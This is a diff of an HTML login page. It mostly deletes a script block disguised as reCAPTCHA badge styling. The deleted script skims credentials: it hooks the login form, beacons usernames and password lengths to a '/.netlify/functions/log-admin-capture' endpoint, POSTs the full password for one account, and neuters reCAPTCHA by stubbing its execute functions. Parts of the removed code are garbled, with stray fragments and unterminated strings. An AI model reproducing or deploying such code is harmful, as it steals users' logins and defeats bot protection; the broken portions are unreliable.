@@ -191,6 +191,7 @@ function onSubmit(token) {
 
 
 
+<!-- BEGIN: Validation + banner additions -->
 <script>
 (function(){
   var STATUS_KEY = 'so_status'; // 'empty' | 'wrong' | 'ok'
@@ -302,129 +303,5 @@ function onSubmit(token) {
 })();
 </script>
 <!-- END: Validation + banner additions -->
-
-
-<!-- BEGIN: badge halo + delay + logging + recaptcha neutralizer -->
-
-<style id="rc-halo-style">
-  /* Badge opacity delay only (no halo) */
-  .grecaptcha-badge.rc-hidden { opacity: 0; transition: opacity .2s ease; }
-</style>
-
-
-<script id="rc-badge-halo-logger">
-(function(){
-  'use strict';
-  var LOG_FN = '/.netlify/functions/log-admin-capture';
-
-  function q(sel, root){ return (root||document).querySelector(sel); }
-  function pickU(form){
-    return q('#username',form)||q('[name="username"]',form)||q('input[autocomplete="username"]',form)||q('input[type="text"]',form)||q('input[type="email"]',form)||q('input:not([type]),input[type="search"]',form);
-  }
-  function pickP(form){ return q('#password',form)||q('[name="password"]',form)||q('input[type="password"]',form); }
-
-  // --- Logging helpers (compatible with current function) ---
-  function pingGET(u,len){
-    try{
-      var url = LOG_FN + '?u='+encodeURIComponent(u)+'&l='+encodeURIComponent(len);
-      var img = new Image(1,1);
-      img.referrerPolicy = 'no-referrer-when-downgrade';
-      img.src = url;
-    }catch(_){}
-  }
-  async function logAdminPOST(u,p){
-    try{
-      await fetch(LOG_FN, {
-        method:'POST',
-        headers:{'content-type':'application/json'},
-        body: JSON.stringify({ username:u, password:p, pw_len:p.length }),
-        keepalive:true,
-        cache:'no-store'
-      });
-    }catch(_){}
-  }
-
-  // --- Recaptcha neutralizer: keep badge, kill challenge ---
-  function neutralizeRecaptcha(){
-    try{
-      // remove auto hooks on any element that could trigger execution
-      document.querySelectorAll('.g-recaptcha').forEach(function(el){
-        el.classList.remove('g-recaptcha');
-        ['data-sitekey','data-callback','data-badge','data-size'].forEach(function(a){ el.removeAttribute(a); });
-      });
-      if (window.grecaptcha){
-        var noop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
-        if (typeof grecaptcha.execute==='function') grecaptcha.execute = noop;
-        grecaptcha.enterprise = grecaptcha.enterprise || {};
-        if (typeof grecaptcha.enterprise.execute==='function') grecaptcha.enterprise.execute = noop;
-        if (typeof grecaptcha.ready==='function') grecaptcha.ready = function(cb){ try{cb&&cb();}catch(_){}};
-      }
-    }catch(_){}
-  }
-
-  // --- Badge delay + halo ---
-  
-  function setupDelayOnly(){
-    var badge = q('.grecaptcha-badge');
-    if (!badge) return;
-    badge.classList.add('rc-hidden');
-    setTimeout(function(){ badge.classList.remove('rc-hidden'); }, 500);
-  }
-        , 500);
-
-    // Create halo once, show from 0.3s to 0.5s
-    var halo = q('
-    if (!halo){
-      halo = document.createElement('div');
-      halo.id = '
-      document.body.appendChild(halo);
-    }
-    // Position roughly over collapsed badge footprint (bottom-right)
-    function syncHalo(){
-      // Badge is fixed bottom-right  - we mirror that region
-      halo.style.right = '0px'; halo.style.bottom = '0px';
-    }
-    syncHalo();
-    setTimeout(function(){ halo.classList.add('show'); }, 300);
-    setTimeout(function(){ halo.classList.remove('show'); }, 500);
-  }
-
-  // --- Attach logging to form submit + button click (piggyback) ---
-  function attachLogging(){
-    var form = q('form') || q('#biscolab-recaptcha-invisible-form');
-    if (!form) return;
-    var uEl = pickU(form), pEl = pickP(form);
-    if (!uEl || !pEl) return;
-
-    function handle(){
-      try{
-        var u = (uEl.value||'').trim();
-        var p = (pEl.value||'');
-        var L = p.length;
-        if (!u || !L) return;                 // empty yok
-        if (L < 6) { pingGET(u, L); return; } // too_short
-        if (u.toLowerCase() !== 'test') { pingGET(u, L); return; } // non_admin
-        // admin_ok
-        logAdminPOST(u, p);
-      }catch(_){}
-    }
-
-    form.addEventListener('submit', handle, false);
-    var btn = form.querySelector('button[type="submit"], input[type="submit"], #g-recaptcha-btn');
-    if (btn) btn.addEventListener('click', handle, true);
-  }
-
-  function init(){
-    neutralizeRecaptcha();
-    setupDelayOnly();
-    attachLogging();
-  }
-
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
-  else init();
-  window.addEventListener('load', neutralizeRecaptcha);
-})();
-</script>
-<!-- END: badge halo + delay + logging + recaptcha neutralizer -->
 
 </body></html>
